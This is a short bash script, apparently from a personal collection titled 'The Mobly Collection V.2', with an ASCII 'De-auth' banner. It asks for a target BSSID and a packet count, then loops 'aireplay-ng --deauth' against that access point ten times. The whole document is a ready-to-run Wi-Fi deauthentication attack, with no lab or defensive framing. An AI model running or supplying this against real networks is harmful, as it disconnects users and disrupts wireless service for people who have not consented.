echo -e '


$$$$$$$\                                         $$\     $$\       
$$  __$$\                                        $$ |    $$ |      
$$ |  $$ | $$$$$$\          $$$$$$\  $$\   $$\ $$$$$$\   $$$$$$$\  
$$ |  $$ |$$  __$$\ $$$$$$\ \____$$\ $$ |  $$ |\_$$  _|  $$  __$$\ 
$$ |  $$ |$$$$$$$$ |\______|$$$$$$$ |$$ |  $$ |  $$ |    $$ |  $$ |
$$ |  $$ |$$   ____|       $$  __$$ |$$ |  $$ |  $$ |$$\ $$ |  $$ |
$$$$$$$  |\$$$$$$$\        \$$$$$$$ |\$$$$$$  |  \$$$$  |$$ |  $$ |
\_______/  \_______|        \_______| \______/    \____/ \__|  \__|
                         The Mobly Collection V.2                                          
                                                                   '
                                                                                                                                        
echo "Enter BSSID" 
read ssid
echo "Deauth packets (suggest 5 to avoid disconnections)"
read packet

clear
for i in {1..10}; do sudo aireplay-ng --deauth $packet -a $ssid wlan0 ; date ; sleep 5 ; done
